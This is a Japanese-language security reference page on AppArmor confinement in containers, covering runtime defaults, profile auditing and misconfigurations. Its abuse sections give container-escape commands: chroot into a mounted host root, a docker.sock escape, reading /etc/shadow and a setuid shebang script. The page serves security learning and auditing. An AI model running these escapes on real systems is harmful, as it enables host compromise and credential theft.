# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## コンテナ分離における役割

AppArmor は、プログラムごとの profile を通じて制限を適用する **Mandatory Access Control** システムです。ユーザーやグループの所有権に大きく依存する従来の DAC チェックとは異なり、AppArmor では kernel がプロセス自体に紐付いた policy を強制できます。コンテナ環境では、workload がある操作を試みるのに十分な従来型の権限を持っていても、AppArmor profile が関連する path、mount、network の動作、または capability の使用を許可していないために拒否される可能性があります。

最も重要な概念は、AppArmor が **path-based** であることです。SELinux のように label を使用するのではなく、path rule を通じて filesystem へのアクセスを判断します。そのため理解しやすく強力ですが、bind mounts と別の path layout には注意が必要です。同じ host のコンテンツが別の path から到達可能になると、policy の効果が operator の最初の想定どおりにならない可能性があります。

## コンテナ分離における役割

Container security review では capabilities と seccomp で確認を終えることがよくありますが、それらのチェック後も AppArmor は重要です。想定以上の privilege を持つコンテナや、運用上の理由から追加の capability を 1 つ必要とする workload を考えてみてください。AppArmor は、file access、mount の動作、networking、execution pattern を引き続き制限できるため、明らかな abuse path を阻止できます。これが、「application を動作させるため」だけに AppArmor を無効化することが、単に risky な configuration を、実際に exploit 可能なものへと静かに変えてしまう理由です。

## Lab

host 上で AppArmor が有効か確認するには、次を使用します。
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
現在のコンテナプロセスがどのユーザーで実行されているかを確認するには:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
この違いは示唆的です。通常の場合、プロセスには runtime が選択した profile に紐づく AppArmor コンテキストが表示されるはずです。unconfined の場合、この追加の制限レイヤーはなくなります。

Docker が適用したと認識している内容を確認することもできます。
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Dockerは、hostがそれをサポートしている場合、defaultまたはcustom AppArmor profileを適用できます。PodmanもAppArmorベースのsystemでAppArmorと統合できますが、SELinux-firstのdistributionでは、通常はもう一方のMAC systemが中心的な役割を担います。Kubernetesは、実際にAppArmorをサポートしているnode上で、workloadレベルのAppArmor policyを公開できます。LXCおよび関連するUbuntu-familyのsystem-container環境でも、AppArmorが広く使用されています。

実務上重要なのは、AppArmorが「Dockerのfeature」ではないという点です。AppArmorはhost kernelのfeatureであり、複数のruntimeが適用を選択できます。hostがAppArmorをサポートしていない場合、またはruntimeがunconfinedで実行するよう指示されている場合、想定されるprotectionは実際には存在しません。

Kubernetesでは、modern APIは`securityContext.appArmorProfile`です。Kubernetes `v1.30`以降、以前のbeta AppArmor annotationはdeprecatedです。サポート対象のhostでは、`RuntimeDefault`がdefault profileであり、`Localhost`はnode上ですでにloadされている必要があるprofileを指定します。これはreview時に重要です。manifestがAppArmorを意識しているように見えても、実際にはnode側のsupportとpreloaded profileに完全に依存している可能性があるためです。

微妙ですが有用な運用上のdetailとして、`appArmorProfile.type: RuntimeDefault`を明示的に設定することは、単にfieldを省略するよりstrictです。fieldを明示的に設定し、nodeがAppArmorをサポートしていない場合、admissionはfailするはずです。fieldを省略した場合、workloadはAppArmorのないnode上でも実行され、その追加のconfinement layerを受けない可能性があります。attackerの観点では、manifestと実際のnode stateの両方を確認する良い理由になります。

Dockerに対応したAppArmor hostで、最もよく知られているdefaultは`docker-default`です。このprofileはMobyのAppArmor templateから生成され、default container内で一部のcapabilityベースのPoCが依然としてfailする理由を説明する重要なものです。大まかに言えば、`docker-default`は通常のnetworkingを許可し、`/proc`の広範な部分へのwriteをdenyし、`/sys`のsensitiveな部分へのaccessをdenyし、mount operationをblockし、generalなhost-probing primitiveにならないようptraceをrestrictします。このbaselineを理解すると、「containerが`CAP_SYS_ADMIN`を持っている」ことと、「そのcapabilityを、自分が調査したいkernel interfaceに対して実際に使用できる」ことを区別できます。

## Profile Management

AppArmor profileは通常、`/etc/apparmor.d/`以下に保存されます。一般的なnaming conventionでは、executable path内のslashをdotに置き換えます。たとえば、`/usr/bin/man`用のprofileは通常、`/etc/apparmor.d/usr.bin.man`として保存されます。このdetailはdefenseとassessmentの両方で重要です。active profile名が分かれば、host上で対応するfileをすばやく見つけられることが多いためです。

host側で役立つmanagement commandには、次のものがあります。
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
これらのコマンドが container-security のリファレンスで重要なのは、profile が実際にどのように作成、読み込み、complain mode への切り替え、アプリケーション変更後の変更を行われるのかを説明しているためです。operator が troubleshooting 中に profile を complain mode に移行し、enforcement に戻すのを忘れる習慣があると、ドキュメント上では container が保護されているように見えても、実際にははるかに緩い状態で動作する可能性があります。

### Profile の作成と更新

`aa-genprof` はアプリケーションの動作を監視し、対話的に profile を生成するのに役立ちます。
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof`は、後で`apparmor_parser`で読み込めるテンプレートプロファイルを生成できます：
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
バイナリが変更されてポリシーの更新が必要になった場合、`aa-logprof` はログ内で見つかった拒否を再現し、許可または拒否の判断をオペレーターに支援できます：
```bash
sudo aa-logprof
```
### ログ

AppArmor による拒否は、`auditd`、syslog、または `aa-notify` などのツールを通じて確認できることがよくあります：
```bash
sudo aa-notify -s 1 -v
```
これは運用上も攻撃上も有用です。Defenders はこれを使って profiles を改良します。Attackers は、どの正確な path または operation が拒否されているのか、そして exploit chain を阻止している control が AppArmor かどうかを把握するために使用します。

### 正確な Profile File の特定

runtime が container に対して特定の AppArmor profile name を表示する場合、その name をディスク上の profile file に対応付けると便利なことがよくあります。
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
これは、ホスト側のレビューで特に有用です。コンテナが「`lowpriv` プロファイルで実行されている」と示している状態と、「実際のルールは監査または reload が可能な、この特定のファイルに存在する」という状態のギャップを埋められるためです。

### 監査すべき重要度の高いルール

プロファイルを読み取れる場合でも、単純な `deny` 行だけで確認を終えないでください。複数のルールタイプが、コンテナ escape attempt に対して AppArmor がどの程度有効かを大きく左右します。

- `ux` / `Ux`: 対象の binary を unconfined で実行します。到達可能な helper、shell、interpreter が `ux` で許可されている場合、通常は最初にテストすべき対象です。
- `px` / `Px` および `cx` / `Cx`: exec 時に profile transition を実行します。これらは必ずしも問題ではありませんが、現在のプロファイルよりもはるかに広範なプロファイルへ transition する可能性があるため、監査する価値があります。
- `change_profile`: task が、即時または次回の exec 時に、別の loaded profile へ切り替えることを許可します。移行先の profile がより弱い場合、restrictive domain から抜け出すための意図された escape hatch になる可能性があります。
- `flags=(complain)`、`flags=(unconfined)`、または新しい `flags=(prompt)`: これらは、プロファイルをどの程度信頼するかの判断を変える要素です。`complain` は deny を強制せずにログへ記録し、`unconfined` は boundary を削除し、`prompt` は純粋に kernel が強制する deny ではなく、userspace の判断経路に依存します。
- `userns` または `userns create,`: 新しい AppArmor policy では、user namespace の作成を mediate できます。container profile が明示的にこれを許可している場合、platform が hardening strategy の一部として AppArmor を使用していても、nested user namespace は引き続き利用可能です。

ホスト側で使用できる grep：
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
この種の audit は、何百もの通常の file rule を眺めるより役立つことが多いです。breakout が helper の実行、新しい namespace への移行、またはより制限の緩い profile への escape に依存している場合、その答えは明らかな `deny /etc/shadow r` のような行ではなく、こうした transition 指向の rule に隠れていることがよくあります。

## Misconfigurations

最も明白なミスは `apparmor=unconfined` です。Administrators は、profile が危険または予期しないものを正しく block したために失敗した application を debugging しているとき、これを設定しがちです。この flag が production に残っていると、MAC layer 全体が事実上無効化されています。

もう1つの subtle な問題は、file permissions が正常に見えるため bind mounts は harmless だと思い込むことです。AppArmor は path-based なので、alternate mount locations の下に host paths を公開すると、path rules と悪影響を及ぼす可能性があります。3つ目のミスは、config file 内の profile name は、host kernel が実際に AppArmor を enforcing していなければ、ほとんど意味を持たないことを忘れることです。

## Abuse

AppArmor がなくなると、それまで制限されていた operations が突然動作する可能性があります。たとえば、bind mounts 経由で sensitive paths を読み取る、より使いにくい状態にしておくべき procfs や sysfs の一部に access する、capabilities/seccomp でも許可されていれば mount-related actions を実行する、または profile が通常 deny する paths を使用する、といったことです。AppArmor は、capability-based breakout attempt が理論上は「should work」するように見えるのに、実際には失敗する理由を説明する mechanism であることがよくあります。AppArmor を取り除くと、同じ attempt が成功し始める可能性があります。

AppArmor が path-traversal、bind-mount、または mount-based abuse chain を止めている主な要因だと疑われる場合、通常の最初の step は、profile の有無によって何が accessible になるかを比較することです。たとえば、host path が container 内に mount されている場合、まずそれを traverse して read できるかを確認します。
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
コンテナに `CAP_SYS_ADMIN` のような危険な capability もある場合、最も実用的なテストの1つは、mount 操作や機密性の高い kernel filesystem へのアクセスをブロックしている制御が AppArmor かどうかを確認することです。
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
ホストパスがすでに bind mount を通じて利用可能な環境では、AppArmor が失われることで、読み取り専用の情報漏えい問題がホストファイルへの直接アクセスに変わる可能性もあります。
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
これらのコマンドの要点は、AppArmor だけで breakout が発生するということではありません。AppArmor が削除されると、多くの filesystem および mount ベースの abuse パスを直ちにテストできるようになるということです。

### 完全な例: AppArmor 無効化 + ホスト root のマウント

コンテナにすでにホスト root が `/host` へ bind-mount されている場合、AppArmor を削除することで、ブロックされていた filesystem abuse パスが完全な host escape へと変わる可能性があります。
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
shell が host filesystem 経由で実行されると、workload は実質的に container boundary を脱出した状態になります:
```bash
id
hostname
cat /etc/shadow | head
```
### 完全な例: AppArmor 無効 + Runtime Socket

本当の障壁が runtime state を保護する AppArmor だった場合、mounted socket だけで完全な escape が可能になることがあります:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
正確なパスはマウントポイントによって異なりますが、最終的な結果は同じです。AppArmorはもはやruntime APIへのアクセスを防止できず、runtime APIによってホストを侵害可能なcontainerを起動できます。

### 完全な例: パスベースのbind-mount bypass

AppArmorはパスベースであるため、`/proc/**`を保護しても、異なるパス経由で到達可能な同じホストのprocfsコンテンツが自動的に保護されるわけではありません。
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
影響は、何が正確に mount されているか、また代替パスが他の controls も bypass するかどうかによって異なります。しかし、このパターンは、AppArmor を単独で評価するのではなく、mount layout と組み合わせて評価しなければならない最も明確な理由の一つです。

### Full Example: Shebang Bypass

AppArmor policy は、shebang handling を介した script execution を十分に考慮せず、interpreter path を対象にすることがあります。過去の例では、先頭行が confined interpreter を指す script を使用していました。
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
この種の例は、profile の意図と実際の実行セマンティクスが乖離する可能性があることを再認識するうえで重要です。container 環境で AppArmor を確認する際は、interpreter chain と代替の実行経路に特に注意を払う必要があります。

## チェック

これらのチェックの目的は、次の3つの疑問にすばやく答えることです。host で AppArmor が有効になっているか、現在の process が confinement 下にあるか、そして runtime が実際にこの container に profile を適用したか。
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
ここで注目すべき点：

- `/proc/self/attr/current` が `unconfined` を示している場合、workload は AppArmor の confinement の恩恵を受けていません。
- `aa-status` が AppArmor を disabled または not loaded と示している場合、runtime config にある profile name はほとんど cosmetic です。
- `docker inspect` が `unconfined` または予期しない custom profile を示している場合、それが filesystem または mount-based abuse path が機能する理由であることがよくあります。
- `/sys/kernel/security/apparmor/profiles` に想定した profile が含まれていない場合、runtime または orchestrator の configuration だけでは不十分です。
- supposedly hardened な profile に `ux`、広範な `change_profile`、`userns`、または `flags=(complain)` 形式の rules が含まれている場合、実際の boundary は profile name が示すよりもはるかに弱い可能性があります。

container がすでに operational reasons により elevated privileges を持っている場合でも、AppArmor を enabled のままにしておくことが、controlled exception と、はるかに広範な security failure の違いになることがよくあります。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor 対応 host ではデフォルトで Enabled | override されない限り `docker-default` AppArmor profile を使用 | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Podman | Host に依存 | AppArmor は `--security-opt` を通じて support されますが、正確な default は host/runtime に依存し、Docker の documented な `docker-default` profile ほど universal ではありません | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Kubernetes | Conditional default | `appArmorProfile.type` が指定されていない場合、default は `RuntimeDefault` ですが、node で AppArmor が enabled の場合にのみ適用されます | `securityContext.appArmorProfile.type: Unconfined`、weak profile を指定する `securityContext.appArmorProfile.type: Localhost`、AppArmor support のない node |
| containerd / CRI-O under Kubernetes | Node/runtime support に従う | Kubernetes が support する一般的な runtime は AppArmor を support しますが、実際の enforcement は node support と workload settings に依存します | Kubernetes の行と同じ。direct runtime configuration により AppArmor を完全に skip することも可能 |

AppArmor では、最も重要な variable は runtime だけでなく、host であることがよくあります。manifest の profile setting は、AppArmor が enabled でない node 上に confinement を作り出しません。

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
